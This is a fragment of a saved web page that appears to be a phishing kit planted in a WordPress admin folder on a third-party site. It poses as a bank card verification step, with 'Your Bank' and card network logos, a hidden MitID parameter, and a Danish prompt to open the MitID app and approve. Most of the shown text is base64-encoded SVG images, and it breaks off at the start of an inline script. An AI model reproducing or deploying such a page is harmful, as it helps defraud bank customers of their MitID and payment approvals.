DEuNDUsNjkwLjYyMSBjIDAsLTQ4Ljg5MSAtMzkuNjMsLTg4LjUxOSAtODguNTMsLTg4LjUxOSAtNDguODgsMCAtODguNTIsMzkuNjI4IC04OC41Miw4OC41MTkgMCw0OC44OTEgMzkuNjQsODguNTMxIDg4LjUyLDg4LjUzMSA0OC45LDAgODguNTMsLTM5LjY0IDg4LjUzLC04OC41MzEiIC8+PHBhdGgKICAgICAgICAgaWQ9InBhdGgyNiIKICAgICAgICAgc3R5bGU9ImZpbGw6IzUyYzRmMTtmaWxsLW9wYWNpdHk6MTtmaWxsLXJ1bGU6bm9uemVybztzdHJva2U6bm9uZSIKICAgICAgICAgZD0ibSAyODM0LjY0LDM5Ny44NzEgYyAwLC02Ny4yMyAtNTQuNDksLTEyMS43MTkgLTEyMS43MiwtMTIxLjcxOSAtNjcuMjMsMCAtMTIxLjcyLDU0LjQ4OSAtMTIxLjcyLDEyMS43MTkgMCw2Ny4yMzEgNTQuNDksMTIxLjcyMyAxMjEuNzIsMTIxLjcyMyA2Ny4yMywwIDEyMS43MiwtNTQuNDkyIDEyMS43MiwtMTIxLjcyMyIgLz48cGF0aAogICAgICAgICBpZD0icGF0aDI4IgogICAgICAgICBzdHlsZT0iZmlsbDojNTJjNGYxO2ZpbGwtb3BhY2l0eToxO2ZpbGwtcnVsZTpub256ZXJvO3N0cm9rZTpub25lIgogICAgICAgICBkPSJNIDI1MjQuNjIsMTA1LjExNyBDIDI1MjQuNjIsNDcuMDU4NiAyNDc3LjU2LDAgMjQxOS41LDAgYyAtNTguMDUsMCAtMTA1LjEyLDQ3LjA1ODYgLTEwNS4xMiwxMDUuMTE3IDAsNTguMDcxIDQ3LjA3LDEwNS4xMzMgMTA1LjEyLDEwNS4xMzMgNTguMDYsMCAxMDUuMTIsLTQ3LjA2MiAxMDUuMTIsLTEwNS4xMzMiIC8+PC9nPjwvZz48L3N2Zz4K" alt="Your Bank" class="logo network"></div>
            <div class="imgcon">
                <div class="lang lane">
                    <a href="#"><img data-savepage-currentsrc="https://www.asesoriafersan.com/wp-admin/css/colors/blue/dodk/verification_files/en.svg" data-savepage-src="./verification_files/en.svg" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGhlaWdodD0iNDgwIiB3aWR0aD0iNjQwIiB2aWV3Qm94PSIwIDAgNjQwIDQ4MCI+CiAgPGRlZnM+CiAgICA8Y2xpcFBhdGggaWQ9ImEiPgogICAgICA8cGF0aCBmaWxsLW9wYWNpdHk9Ii42NyIgZD0iTS04NS4zMzMgMGg2ODIuNjd2NTEyaC02ODIuNjd6Ii8+CiAgICA8L2NsaXBQYXRoPgogIDwvZGVmcz4KICA8ZyBjbGlwLXBhdGg9InVybCgjYSkiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDgwKSBzY2FsZSguOTQpIj4KICAgIDxnIHN0cm9rZS13aWR0aD0iMXB0Ij4KICAgICAgPHBhdGggZmlsbD0iIzAwNiIgZD0iTS0yNTYgMEg3NjguMDJ2NTEyLjAxSC0yNTZ6Ii8+CiAgICAgIDxwYXRoIGQ9Ik0tMjU2IDB2NTcuMjQ0bDkwOS41MzUgNDU0Ljc2OEg3NjguMDJWNDU0Ljc3TC0xNDEuNTE1IDBILTI1NnpNNzY4LjAyIDB2NTcuMjQzTC0xNDEuNTE1IDUxMi4wMUgtMjU2di01Ny4yNDNMNjUzLjUzNSAwSDc2OC4wMnoiIGZpbGw9IiNmZmYiLz4KICAgICAgPHBhdGggZD0iTTE3MC42NzUgMHY1MTIuMDFoMTcwLjY3VjBoLTE3MC42N3pNLTI1NiAxNzAuNjd2MTcwLjY3SDc2OC4wMlYxNzAuNjdILTI1NnoiIGZpbGw9IiNmZmYiLz4KICAgICAgPHBhdGggZD0iTS0yNTYgMjA0LjgwNHYxMDIuNDAySDc2OC4wMlYyMDQuODA0SC0yNTZ6TTIwNC44MSAwdjUxMi4wMWgxMDIuNFYwaC0xMDIuNHpNLTI1NiA1MTIuMDFMODUuMzQgMzQxLjM0aDc2LjMyNGwtMzQxLjM0IDE3MC42N0gtMjU2ek0tMjU2IDBMODUuMzQgMTcwLjY3SDkuMDE2TC0yNTYgMzguMTY0VjB6bTYwNi4zNTYgMTcwLjY3TDY5MS42OTYgMGg3Ni4zMjRMNDI2LjY4IDE3MC42N2gtNzYuMzI0ek03NjguMDIgNTEyLjAxTDQyNi42OCAzNDEuMzRoNzYuMzI0TDc2OC4wMiA0NzMuODQ4djM4LjE2MnoiIGZpbGw9IiNjMDAiLz4KICAgIDwvZz4KICA8L2c+Cjwvc3ZnPgo="></a>

                </div>
            </div>
            <div class="imgcon"><img data-savepage-currentsrc="https://www.asesoriafersan.com/wp-admin/css/colors/blue/dodk/verification_files/1.svg" data-savepage-src="./verification_files/1.svg" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPCFET0NUWVBFIHN2ZyBQVUJMSUMgIi0vL1czQy8vRFREIFNWRyAxLjEvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvR3JhcGhpY3MvU1ZHLzEuMS9EVEQvc3ZnMTEuZHRkIj4KPHN2ZyB2ZXJzaW9uPSIxLjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjAiIHk9IjAiIHdpZHRoPSIyMzUiIGhlaWdodD0iOTMiIHZpZXdCb3g9IjAsIDAsIDIzNSwgOTMiPgogIDxnIGlkPSJCYWNrZ3JvdW5kIj4KICAgIDxyZWN0IHg9IjAiIHk9IjAiIHdpZHRoPSIyMzUiIGhlaWdodD0iOTMiIGZpbGw9IiNGRkZGRkYiLz4KICA8L2c+CiAgPGcgaWQ9ImcxMCI+CiAgICA8cGF0aCBkPSJNMTE2LjM4MiwxLjMxNyBMMTAwLjk4NSw3My4yODQgTDgyLjM2OSw3My4yODQgTDk3Ljc2NywxLjMxNyB6IE0xOTQuNzA5LDQ3Ljc4NSBMMjA0LjUxLDIwLjc2IEwyMTAuMTUxLDQ3Ljc4NSB6IE0yMTUuNDgsNzMuMjg0IEwyMzIuNyw3My4yODQgTDIxNy42NzQsMS4zMTcgTDIwMS43NzcsMS4zMTcgQzE5OC4yMDcsMS4zMTcgMTk1LjE5MywzLjM5NSAxOTMuODUzLDYuNTk3IEwxNjUuOTIyLDczLjI4NCBMMTg1LjQ3LDczLjI4NCBMMTg5LjM1Myw2Mi41MzcgTDIxMy4yMzgsNjIuNTM3IHogTTE2Ni44OTMsNDkuNzg3IEMxNjYuOTcyLDMwLjc5MiAxNDAuNjIzLDI5Ljc0NiAxNDAuODA3LDIxLjI2IEMxNDAuODYxLDE4LjY3NyAxNDMuMzIyLDE1LjkzMyAxNDguNzAxLDE1LjIzIEMxNTEuMzczLDE0Ljg4MiAxNTguNzE5LDE0LjYxNCAxNjcuMDYxLDE4LjQ1MiBMMTcwLjMyNywzLjE5MiBDMTY1Ljg0OCwxLjU2NCAxNjAuMDgxLDAgMTUyLjkxMiwwIEMxMzQuNTEyLDAgMTIxLjU1OSw5Ljc4NCAxMjEuNDUsMjMuNzkyIEMxMjEuMzM0LDM0LjE1MiAxMzAuNjk1LDM5LjkzMSAxMzcuNzUxLDQzLjM3NyBDMTQ1LjAwMiw0Ni45MDUgMTQ3LjQzOSw0OS4xNjQgMTQ3LjQwOCw1Mi4zMTggQzE0Ny4zNiw1Ny4xNSAxNDEuNjIyLDU5LjI3OCAxMzYuMjY5LDU5LjM2MyBDMTI2LjkwNyw1OS41MSAxMjEuNDc1LDU2LjgzNSAxMTcuMTQ1LDU0LjgxOCBMMTEzLjc3MSw3MC41ODYgQzExOC4xMjEsNzIuNTg1IDEyNi4xNDksNzQuMzIgMTM0LjQ3OCw3NC40MSBDMTU0LjAzMyw3NC40MSAxNjYuODI5LDY0Ljc0NiAxNjYuODkzLDQ5Ljc4NyBNODkuNzc5LDEuMzE3IEw1OS42MTcsNzMuMjg0IEwzOS45MzQsNzMuMjg0IEwyNS4wOTIsMTUuODQ4IEMyNC4xOTEsMTIuMzEgMjMuNDA3LDExLjAxNyAyMC42NjUsOS41MjcgQzE2LjE5NSw3LjA5OSA4LjgwNCw0LjgyIDIuMywzLjQwOCBMMi43NDUsMS4zMTcgTDM0LjQyMiwxLjMxNyBDMzguNDU5LDEuMzE3IDQyLjA5MSw0LjAwNCA0My4wMDgsOC42NTMgTDUwLjg0OCw1MC4zMDIgTDcwLjIyMSwxLjMxNyBMODkuNzc5LDEuMzE3IiBmaWxsPSIjMUQzMzdBIiBpZD0icGF0aDE0Ii8+CiAgPC9nPgo8L3N2Zz4K" alt="Card Network" class="logo bank"></div>
        </header>

        <section class="container" style="padding: 0px; flex: auto">

            <section>
                      <div class="mitidContextStr"><b>Abn MitID app og godkend</b></div>

            </section>

            <section class="mitidContainer">
                <div style="display:none;" id="mitid_parameters">7a2f8e6a-5a1c-4de4-ba69-d11305a3b8ac</div>
                <br>
                <p id="mitId" style="font-weight: bold; font-size: 20px; text-align: center;">Åbn MitID app og godkend</p>

                <div class="container1">
                    <object type="image/svg+xml" id="code-app-emulator" class="code-app-emulator" data-savepage-data="./media/code-app-slider-emulator.svg" data="data:image/svg+xml;base64,PHN2ZyBpZD0iZXRaR0gyUXo5dzAxIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2aWV3Qm94PSIwIDAgMTgwIDE2MCIgc2hhcGUtcmVuZGVyaW5nPSJnZW9tZXRyaWNQcmVjaXNpb24iIHRleHQtcmVuZGVyaW5nPSJnZW9tZXRyaWNQcmVjaXNpb24iPjxwYXRoIGlkPSJldFpHSDJRejl3MDIiIGQ9Ik04My44NzM2ODQsMEwxMi4xMjYzMTYsMEM1LjQ1Njg0MiwwLDAsNS40LDAsMTJMMCwxNDhDMCwxNTQuNiw1LjQ1Njg0MiwxNjAsMTIuMTI2MzE2LDE2MEw4My44NzM2ODQsMTYwQzkwLjU0MzE1OCwxNjAsOTYsMTU0LjYsOTYsMTQ4TDk2LDEyQzk2LDUuNCw5MC41NDMxNTgsMCw4My44NzM2ODQsMEw4My44NzM2ODQsMFoiIHRyYW5zZm9ybT0ibWF0cml4KDEgMCAwIDEgNDIgMCkiIGZpbGw9InJnYigxNDIsMTkyLDI1MCkiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIxIi8+PHBhdGggaWQ9ImV0WkdIMlF6OXcwMyIgZD0iTTc4LjkxNzY0NywwQzgyLjg2MzUyOSwwLDg2LDMuMSw4Niw3TDg2LDE0M0M4NiwxNDYuOCw4Mi44NjM1MjksMTUwLDc4LjkxNzY0NywxNTBMNy4wODIzNTMsMTUwQzMuMjM3NjQ3LDE1MCwwLDE0Ni44LDAsMTQzTDAsN0MwLDMuMSwzLjIzNzY0NywwLDcuMDgyMzUzLDBMNzguOTE3NjQ3LDAiIHRyYW5zZm9ybT0ibWF0cml4KDEgMCAwIDEgNDcgNSkiIGZpbGw9InJnYigyMDAsMjI0LDI1MykiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIxLjE3NjQ3MSIvPjxnIGlkPSJldFpHSDJRejl3MDQiIHRyYW5zZm9ybT0ibWF0cml4KDEgMCAwIDEgMCAtMTApIj48cmVjdCBpZD0iZXRaR0gyUXo5dzA1IiB3aWR0aD0iMTEuNzEwNTI3IiBoZWlnaHQ9IjEyLjI3NTg0MyIgcng9IjMiIHJ5PSIzIiB0cmFuc2Zvcm09Im1hdHJpeCgxLjcwNzg2NSAwIDAgMS42MjkyMTYgODAuMDAwMDAxIDU1LjEwMTA3MSkiIGZpbGw9InJnYigyNTUsMjU1LDI1NSkiIGZpbGwtb3BhY2l0eT0iMC42IiBzdHJva2U9Im5vbmUiIHN0cm9rZS13aWR0aD0iMCIvPjxyZWN0IGlkPSJldFpHSDJRejl3MDYiIHdpZHRoPSIxMS43MTA1MjciIGhlaWdodD0iMTIuMjc1ODQzIiByeD0iMyIgcnk9IjMiIHRyYW5zZm9ybT0ibWF0cml4KDEuNzA3ODY1IDAgMCAxLjYyOTIxNiA1NS4wMDAwMDEgNTUuMTAxMDcxKSIgZmlsbD0icmdiKDI1NSwyNTUsMjU1KSIgZmlsbC1vcGFjaXR5PSIwLjYiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIwIi8+PHJlY3QgaWQ9ImV0WkdIMlF6OXcwNyIgd2lkdGg9IjExLjcxMDUyNyIgaGVpZ2h0PSIxMi4yNzU4NDMiIHJ4PSIzIiByeT0iMyIgdHJhbnNmb3JtPSJtYXRyaXgoMS43MDc4NjUgMCAwIDEuNjI5MjE2IDgwLjAwMDAxOCAzMC4xMDEwNzEpIiBmaWxsPSJyZ2IoMjU1LDI1NSwyNTUpIiBmaWxsLW9wYWNpdHk9IjAuNiIgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjAiLz48cmVjdCBpZD0iZXRaR0gyUXo5dzA4IiB3aWR0aD0iMTEuNzEwNTI3IiBoZWlnaHQ9IjEyLjI3NTg0MyIgcng9IjMiIHJ5PSIzIiB0cmFuc2Zvcm09Im1hdHJpeCgxLjcwNzg2NSAwIDAgMS42MjkyMTYgNTUuMDAwMDE4IDMwLjEwMTA3MSkiIGZpbGw9InJnYigyNTUsMjU1LDI1NSkiIGZpbGwtb3BhY2l0eT0iMC42IiBzdHJva2U9Im5vbmUiIHN0cm9rZS13aWR0aD0iMCIvPjxyZWN0IGlkPSJldFpHSDJRejl3MDkiIHdpZHRoPSIxMS43MTA1MjciIGhlaWdodD0iMTIuMjc1ODQzIiByeD0iMyIgcnk9IjMiIHRyYW5zZm9ybT0ibWF0cml4KDEuNzA3ODY1IDAgMCAxLjYyOTIxNiAxMDUuMDAwMDAxIDU1LjEwMTA3MSkiIGZpbGw9InJnYigyNTUsMjU1LDI1NSkiIGZpbGwtb3BhY2l0eT0iMC42IiBzdHJva2U9Im5vbmUiIHN0cm9rZS13aWR0aD0iMCIvPjxyZWN0IGlkPSJldFpHSDJRejl3MDEwIiB3aWR0aD0iMTEuNzEwNTI3IiBoZWlnaHQ9IjEyLjI3NTg0MyIgcng9IjMiIHJ5PSIzIiB0cmFuc2Zvcm09Im1hdHJpeCgxLjcwNzg2NSAwIDAgMS42MjkyMTYgODAuMDAwMDAxIDEwNC44OTg5MjkpIiBmaWxsPSJyZ2IoMjU1LDI1NSwyNTUpIiBmaWxsLW9wYWNpdHk9IjAuNiIgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjAiLz48cmVjdCBpZD0iZXRaR0gyUXo5dzAxMSIgd2lkdGg9IjExLjcxMDUyNyIgaGVpZ2h0PSIxMi4yNzU4NDMiIHJ4PSIzIiByeT0iMyIgdHJhbnNmb3JtPSJtYXRyaXgoMS43MDc4NjUgMCAwIDEuNjI5MjE2IDU1LjAwMDAwMSAxMDQuODk4OTI5KSIgZmlsbD0icmdiKDI1NSwyNTUsMjU1KSIgZmlsbC1vcGFjaXR5PSIwLjYiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIwIi8+PHJlY3QgaWQ9ImV0WkdIMlF6OXcwMTIiIHdpZHRoPSIxMS43MTA1MjciIGhlaWdodD0iMTIuMjc1ODQzIiByeD0iMyIgcnk9IjMiIHRyYW5zZm9ybT0ibWF0cml4KDEuNzA3ODY1IDAgMCAxLjYyOTIxNiAxMDUuMDAwMDAxIDEwNC44OTg5MjkpIiBmaWxsPSJyZ2IoMjU1LDI1NSwyNTUpIiBmaWxsLW9wYWNpdHk9IjAuNiIgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjAiLz48cmVjdCBpZD0iZXRaR0gyUXo5dzAxMyIgd2lkdGg9IjExLjcxMDUyNyIgaGVpZ2h0PSIxMi4yNzU4NDMiIHJ4PSIzIiByeT0iMyIgdHJhbnNmb3JtPSJtYXRyaXgoMS43MDc4NjUgMCAwIDEuNjI5MjE2IDEwNS4wMDAwMDEgODAuMTAxMDcxKSIgZmlsbD0icmdiKDI1NSwyNTUsMjU1KSIgZmlsbC1vcGFjaXR5PSIwLjYiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIwIi8+PHJlY3QgaWQ9ImV0WkdIMlF6OXcwMTQiIHdpZHRoPSIxMS43MTA1MjciIGhlaWdodD0iMTIuMjc1ODQzIiByeD0iMyIgcnk9IjMiIHRyYW5zZm9ybT0ibWF0cml4KDEuNzA3ODY1IDAgMCAxLjYyOTIxNiA1NS4wMDAwMDEgODAuMTAxMDcxKSIgZmlsbD0icmdiKDI1NSwyNTUsMjU1KSIgZmlsbC1vcGFjaXR5PSIwLjYiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIwIi8+PHJlY3QgaWQ9ImV0WkdIMlF6OXcwMTUiIHdpZHRoPSIxMS43MTA1MjciIGhlaWdodD0iMTIuMjc1ODQzIiByeD0iMyIgcnk9IjMiIHRyYW5zZm9ybT0ibWF0cml4KDEuNzA3ODY1IDAgMCAxLjYyOTIxNiAxMDUuMDAwMDAxIDMwLjEwMTA3MSkiIGZpbGw9InJnYigyNTUsMjU1LDI1NSkiIGZpbGwtb3BhY2l0eT0iMC42IiBzdHJva2U9Im5vbmUiIHN0cm9rZS13aWR0aD0iMCIvPjxyZWN0IGlkPSJldFpHSDJRejl3MDE2IiB3aWR0aD0iMTEuNzEwNTI3IiBoZWlnaHQ9IjEyLjI3NTg0MyIgcng9IjMiIHJ5PSIzIiB0cmFuc2Zvcm09Im1hdHJpeCgxLjcwNzg2NSAwIDAgMS42MjkyMTYgODAuMDAwMDAxIDEyOS44OTg5MjkpIiBmaWxsPSJyZ2IoMjU1LDI1NSwyNTUpIiBmaWxsLW9wYWNpdHk9IjAuNiIgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjAiLz48cmVjdCBpZD0iZXRaR0gyUXo5dzAxNyIgd2lkdGg9IjExLjcxMDUyNyIgaGVpZ2h0PSIxMi4yNzU4NDMiIHJ4PSIzIiByeT0iMyIgdHJhbnNmb3JtPSJtYXRyaXgoMS43MDc4NjUgMCAwIDEuNjI5MjE2IDU1LjAwMDAwMSAxMjkuODk4OTI5KSIgZmlsbD0icmdiKDI1NSwyNTUsMjU1KSIgZmlsbC1vcGFjaXR5PSIwLjYiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIwIi8+PC9nPjxnIGlkPSJldFpHSDJRejl3MDE4IiB0cmFuc2Zvcm09Im1hdHJpeCgxIDAgMCAxIDAgLTEwKSIgY2xpcC1wYXRoPSJ1cmwoI2V0WkdIMlF6OXcwMjQpIj48ZyBpZD0iZXRaR0gyUXo5dzAxOSIgdHJhbnNmb3JtPSJtYXRyaXgoMSAwIDAgMSAwLjAwMDAwMSAwLjAwMDAwMSkiPjxyZWN0IGlkPSJldFpHSDJRejl3MDIwIiB3aWR0aD0iMjAiIGhlaWdodD0iMjAiIHJ4PSI1IiByeT0iNSIgdHJhbnNmb3JtPSJtYXRyaXgoMSAwIDAgMSA4MCA4MCkiIGZpbGw9InJnYigwLDk2LDIzMCkiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIwIi8+PHJlY3QgaWQ9ImV0WkdIMlF6OXcwMjEiIHdpZHRoPSIxMS43MTA1MjciIGhlaWdodD0iMTIuMjc1ODQzIiByeD0iMyIgcnk9IjMiIHRyYW5zZm9ybT0ibWF0cml4KDEuNzA3ODY1IDAgMCAxLjYyOTIxNiA4MC4wMDAwMDEgODApIiBmaWxsPSJyZ2IoMCw5NiwyMzApIiBzdHJva2U9Im5vbmUiIHN0cm9rZS13aWR0aD0iMCIvPjxwYXRoIGlkPSJldFpHSDJRejl3MDIzIiBkPSJNNyw5LjhDOCw5LjgsOC44LDksOC44LDhDOC44LDcsOCw2LjIsNyw2LjJDNiw2LjIsNS4yLDcsNS4yLDhDNS4yLDksNiw5LjgsNyw5LjhaTTcsMTAuNUM1LjMsMTAuNSw0LDExLjUsMy44LDEzLjhMMTAuMiwxMy44QzEwLDExLjUsOC43LDEwLjUsNywxMC41Wk0xMi4zLDYuMkwxMSw2LjJMMTEsMTMuOEwxMi4yLDEzLjhDMTUuMywxMy44LDE2LjYsMTIuMSwxNi42LDEwQzE2LjYsNy45LDE1LjMsNi4yLDEyLjMsNi4yWiIgdHJhbnNmb3JtPSJtYXRyaXgoMS4wOTM3NSAwIDAgMS4wOTM3NSA3OC44NDM3NSA3OS4wNjI1KSIgZmlsbD0icmdiKDI1NSwyNTUsMjU1KSIgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjEiLz48L2c+PGNsaXBQYXRoIGlkPSJldFpHSDJRejl3MDI0Ij48cGF0aCBpZD0iZXRaR0gyUXo5dzAyNSIgZD0iTTgzLjg3MzY4NCwwTDEyLjEyNjMxNiwwQzUuNDU2ODQyLDAsMCw1LjQsMCwxMkwwLDE0OEMwLDE1NC42LDUuNDU2ODQyLDE2MCwxMi4xMjYzMTYsMTYwTDgzLjg3MzY4NCwxNjBDOTAuNTQzMTU4LDE2MCw5NiwxNTQuNiw5NiwxNDhMOTYsMTJDOTYsNS40LDkwLjU0MzE1OCwwLDgzLjg3MzY4NCwwTDgzLjg3MzY4NCwwWiIgdHJhbnNmb3JtPSJtYXRyaXgoMSAwIDAgMSA0MiAxMCkiIGZpbGw9InJnYigyNTUsMjU1LDI1NSkiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIxIi8+PC9jbGlwUGF0aD48L2c+PHBhdGggaWQ9ImV0WkdIMlF6OXcwMjYiIGQ9Ik03OC45MTc2NDcsMEM4Mi44NjM1MjksMCw4NiwzLjEsODYsN0w4NiwxNDNDODYsMTQ2LjgsODIuODYzNTI5LDE1MCw3OC45MTc2NDcsMTUwTDcuMDgyMzUzLDE1MEMzLjIzNzY0NywxNTAsMCwxNDYuOCwwLDE0M0wwLDdDMCwzLjEsMy4yMzc2NDcsMCw3LjA4MjM1MywwTDc4LjkxNzY0NywwIiB0cmFuc2Zvcm09Im1hdHJpeCgxIDAgMCAxIDQ3IDUpIiBvcGFjaXR5PSIwIiBmaWxsPSJyZ2IoMjU1LDI1NSwyNTUpIiBzdHJva2U9Im5vbmUiIHN0cm9rZS13aWR0aD0iMS4xNzY0NzEiLz48cGF0aCBpZD0iZXRaR0gyUXo5dzAyNyIgZD0iTTcuNDExMDY0LDEwLjI2MjU4M0M4LjUzOTUyMSwxMC4yNjI1ODMsOS40NDIyODcsOS4zNTk3ODcsOS40NDIyODcsOC4yMzEyOTJDOS40NDIyODcsNy4xMDI3OTYsOC41Mzk1MjEsNi4yLDcuNDExMDY0LDYuMkM2LjI4MjYwNiw2LjIsNS4zNzk4NCw3LjEwMjc5Niw1LjM3OTg0LDguMjMxMjkyQzUuMzc5ODQsOS4zNTk3ODcsNi4yODI2MDYsMTAuMjYyNTgzLDcuNDExMDY0LDEwLjI2MjU4M1pNNy40MTEwNjQsMTEuMDUyNTNDNS40OTI2ODYsMTEuMDUyNTMsNC4wMjU2OTEsMTIuMTgxMDI1LDMuOCwxNC43NzY1NjRMMTEuMDIyMTI4LDE0Ljc3NjU2NEMxMC43OTY0MzYsMTIuMTgxMDI1LDkuMzI5NDQxLDExLjA1MjUzLDcuNDExMDY0LDExLjA1MjUzWk0xMy4zOTE4ODgsNi4yTDExLjkyNDg5NCw2LjJMMTEuOTI0ODk0LDE0Ljc3NjU2NEwxMy4yNzkwNDMsMTQuNzc2NTY0QzE2Ljc3NzI2MSwxNC43NzY1NjQsMTguMjQ0MjU1LDEyLjg1ODEyMiwxOC4yNDQyNTUsMTAuNDg4MjgyQzE4LjI0NDI1NSw4LjExODQ0MiwxNi43NzcyNjEsNi4yLDEzLjM5MTg4OCw2LjJaIiB0cmFuc2Zvcm09Im1hdHJpeCgzLjEzNDExOCAwIDAgMy4xMzQxMjIgNTUuNDU1MzUxIDExLjgwNjUwNykiIGZpbGw9InJnYigwLDk2LDIzMCkiIGZpbGwtb3BhY2l0eT0iMCIgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjEiLz48cGF0aCBpZD0iZXRaR0gyUXo5dzAyOCIgZD0iTTEwLDBMNTAsMEM1NS41LDAsNjAsNC41LDYwLDEwTDYwLDEwQzYwLDE1LjUsNTUuNSwyMCw1MCwyMEwxMCwyMEM0LjUsMjAsMCwxNS41LDAsMTBMMCwxMEMwLDQuNSw0LjUsMCwxMCwwWiIgdHJhbnNmb3JtPSJtYXRyaXgoMSAwIDAgMSA2MCAxMjApIiBvcGFjaXR5PSIwIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGZpbGw9InJnYigwLDk2LDIzMCkiIGZpbGwtcnVsZT0iZXZlbm9kZCIgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjEiLz48ZyBpZD0iZXRaR0gyUXo5dzAyOSIgdHJhbnNmb3JtPSJtYXRyaXgoMSAwIDAgMSAwIC0xMCkiIGNsaXAtcGF0aD0idXJsKCNldFpHSDJRejl3MDMxKSI+PHJlY3QgaWQ9ImV0WkdIMlF6OXcwMzAiIHdpZHRoPSI3LjkzOTUxMiIgaGVpZ2h0PSIzMCIgcng9IjAiIHJ5PSIwIiB0cmFuc2Zvcm09Im1hdHJpeCgtNy41NTcxNCAwIDAgMSA3MCAxMjUpIiBvcGFjaXR5PSIwIiBmaWxsPSJyZ2IoMjU1LDI1NSwyNTUpIiBzdHJva2U9Im5vbmUiIHN0cm9rZS13aWR0aD0iMCIvPjxjbGlwUGF0aCBpZD0iZXRaR0gyUXo5dzAzMSI+PHJlY3QgaWQ9ImV0WkdIMlF6OXcwMzIiIHdpZHRoPSI2OSIgaGVpZ2h0PSIzMyIgcng9IjAiIHJ5PSIwIiB0cmFuc2Zvcm09Im1hdHJpeCgxIDAgMCAxIDU1IDEyNCkiIGZpbGw9InJnYigyNTUsMjU1LDI1NSkiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIwIi8+PC9jbGlwUGF0aD48L2c+PGcgaWQ9ImV0WkdIMlF6OXcwMzMiIHRyYW5zZm9ybT0ibWF0cml4KDEgMCAwIDEgMCAtMTApIiBjbGlwLXBhdGg9InVybCgjZXRaR0gyUXo5dzAzNSkiPjxwYXRoIGlkPSJldFpHSDJRejl3MDM0IiBkPSJNMTAsMEw1MCwwQzU1LjUsMCw2MCw0LjUsNjAsMTBMNjAsMTBDNjAsMTUuNSw1NS41LDIwLDUwLDIwTDEwLDIwQzQuNSwyMCwwLDE1LjUsMCwxMEwwLDEwQzAsNC41LDQuNSwwLDEwLDBaIiB0cmFuc2Zvcm09Im1hdHJpeCgxIDAgMCAxIDIwIDEzMCkiIG9wYWNpdHk9IjAiIGNsaXAtcnVsZT0iZXZlbm9kZCIgZmlsbD0icmdiKDIwMCwyMjQsMjUzKSIgZmlsbC1ydWxlPSJldmVub2RkIiBzdHJva2U9Im5vbmUiIHN0cm9rZS13aWR0aD0iMSIvPjxjbGlwUGF0aCBpZD0iZXRaR0gyUXo5dzAzNSI+PHBhdGggaWQ9ImV0WkdIMlF6OXcwMzYiIGQ9Ik0xMCwwTDUwLDBDNTUuNSwwLDYwLDQuNSw2MCwxMEw2MCwxMEM2MCwxNS41LDU1LjUsMjAsNTAsMjBMMTAsMjBDNC41LDIwLDAsMTUuNSwwLDEwTDAsMTBDMCw0LjUsNC41LDAsMTAsMFoiIHRyYW5zZm9ybT0ibWF0cml4KDEgMCAwIDEgNjAgMTMwKSIgY2xpcC1ydWxlPSJldmVub2RkIiBmaWxsPSJyZ2IoMjU1LDI1NSwyNTUpIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIxIi8+PC9jbGlwUGF0aD48L2c+PGcgaWQ9ImV0WkdIMlF6OXcwMzciIHRyYW5zZm9ybT0ibWF0cml4KDEuMDkzNzUgMCAwIDEuMDkzNzUgNzguODQzNzUgNjkuMDYyNSkiIG9wYWNpdHk9IjAiPjxnIGlkPSJldFpHSDJRejl3MDM4Ij48cGF0aCBpZD0iZXRaR0gyUXo5dzAzOSIgZD0iTTcsOS44QzgsOS44LDguOCw5LDguOCw4QzguOCw3LDgsNi4yLDcsNi4yQzYsNi4yLDUuMiw3LDUuMiw4QzUuMiw5LDYsOS44LDcsOS44Wk03LDEwLjVDNS4zLDEwLjUsNCwxMS41LDMuOCwxMy44TDEwLjIsMTMuOEMxMCwxMS41LDguNywxMC41LDcsMTAuNVpNMTIuMyw2LjJMMTEsNi4yTDExLDEzLjhMMTIuMiwxMy44QzE1LjMsMTMuOCwxNi42LDEyLjEsMTYuNiwxMEMxNi42LDcuOSwxNS4zLDYuMiwxMi4zLDYuMloiIGZpbGw9InJnYigyNTUsMjU1LDI1NSkiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIxIi8+PC9nPjwvZz48c2NyaXB0PjwhW0NEQVRBWyFmdW5jdGlvbih0LG4peyJvYmplY3QiPT10eXBlb2YgZXhwb3J0cyYmInVuZGVmaW5lZCIhPXR5cGVvZiBtb2R1bGU/bW9kdWxlLmV4cG9ydHM9bigpOiJmdW5jdGlvbiI9PXR5cGVvZiBkZWZpbmUmJmRlZmluZS5hbWQ/ZGVmaW5lKG4pOigodD0idW5kZWZpbmVkI